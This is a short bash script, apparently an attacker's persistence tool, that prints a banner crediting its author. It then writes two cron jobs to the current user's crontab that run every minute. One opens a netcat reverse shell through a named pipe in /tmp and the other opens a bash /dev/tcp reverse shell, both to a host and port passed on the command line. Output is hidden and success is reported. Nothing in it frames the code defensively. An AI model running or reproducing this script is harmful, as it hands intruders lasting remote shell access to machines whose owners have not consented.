#!/bin/bash
echo -e "\n\nCode Made By root@kingston \n"
printf"${GREEN}                   oOo 
                             oO
                               o
        |^^^^^^^^^^^^^^^^^^^^^^|____
        | Made by :~ Sagar Khasa |**\___,
        |________________________|__|)__|
        |(@)(@)'''''''''''**|(@)(@)**|(@)
        = = = = = = = = = = = = = = = = = = =
	
	"
echo -e "Injecting Code...\n"

{ crontab -l; echo "* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $1 $2 >/tmp/f"; } | crontab - > /dev/null 2>&1
{ crontab -l; echo "* * * * * bash -i >& /dev/tcp/$1/$2 0>&1"; } | crontab - > /dev/null 2>&1
crontab -l | grep '* * * * * rm /tmp/f;mkfifo /tmp/f;cat' > /dev/null 2>&1

echo -e "${GREEN}[+] CODE INJECTED SUCCESSFULY${ENDCOLOR}\n"
